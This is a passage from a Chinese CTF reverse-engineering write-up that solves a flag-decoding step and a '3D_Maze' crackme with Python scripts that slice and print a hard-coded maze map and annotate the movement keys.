v2 += <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag[<span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span> - i] ^= flag[i]<br>    flag[<span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span> - i] = (flag[<span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span> - i] &gt;&gt; <span class="hljs-number">4</span>) | (flag[<span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span> - i] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="3d_maze"><a class="markdownIt-Anchor" href="#3d_maze"></a> 3D_Maze</h2><h3 id="分析-4"><a class="markdownIt-Anchor" href="#分析-4"></a> 分析</h3><ul><li><p>有题目，可以知道是个三维迷宫题目，有前面的知识可以知道flag的长度为62。这里就是使用小写的<code>awsd</code>和大写的<code>AWSD</code>作为转移，小写是在一个平面上操作，而大写是在立体中进行不同面的变换</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307082138095.png" alt="image-20230708213820034" /></p></li><li><p>这里对于边界条件进行了限制，同时点出了迷宫的大小范围为 <code>6 x 10 x 10</code> 其中主义dword需要将数据转换为dword类型再比较(一开始可以清楚看到100)，后来更改了数据类型，结果也随之改变</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307082140410.png" alt="image-20230708214028372" /></p></li></ul><h3 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment"># 分割迷宫</span><br><span class="hljs-built_in">map</span> = [<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>]<br>maplist=[<span class="hljs-built_in">map</span>[i*<span class="hljs-number">100</span>:i*<span class="hljs-number">100</span>+<span class="hljs-number">100</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>)]<br><span class="hljs-comment"># print(maplist)</span><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> maplist:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==========================================&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-built_in">print</span>(t[i*<span class="hljs-number">10</span>:i*<span class="hljs-number">10</span>+<span class="hljs-number">10</span>])<br><br><span class="hljs-comment"># z=0</span><br><span class="hljs-comment"># ==1=======</span><br><span class="hljs-comment"># ==1====1==</span><br><span class="hljs-comment"># ==1=1111==</span><br><span class="hljs-comment"># ==1=1=====</span><br><span class="hljs-comment"># ==1=111111</span><br><span class="hljs-comment"># ==1=1=====</span><br><span class="hljs-comment"># ==11111111</span><br><span class="hljs-comment"># ==5=1=====</span><br><span class="hljs-comment"># ===*======</span><br><span class="hljs-comment"># ===1======</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># wddwwdddddD</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># z=1</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># =1111=====</span><br><span class="hljs-comment"># =1==111111</span><br><span class="hljs-comment"># =1========</span><br><span class="hljs-comment"># 11========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># 11111=====</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># dwwwdddsdddddD</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># z=2</span><br><span class="hljs-comment"># 1=========</span><br><span class="hljs-comment"># 1=========</span><br><span class="hljs-comment"># 1==1=1===1</span><br><span class="hljs-comment"># ==1=1=1=1=</span><br><span class="hljs-comment"># ==1====1==</span><br><span class="hljs-comment"># ===1===1==</span><br><span class="hljs-comment"># ====1==1==</span><br><span class="hljs-comment"># ==1=1==1==</span><br><span class="hljs-comment"># ===1===1==</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># wwW</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># z=4</span><br><span class="hljs-comment"># ========11</span><br><span class="hljs-comment"># ========1=</span><br><span class="hljs-comment"># 111111111=</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 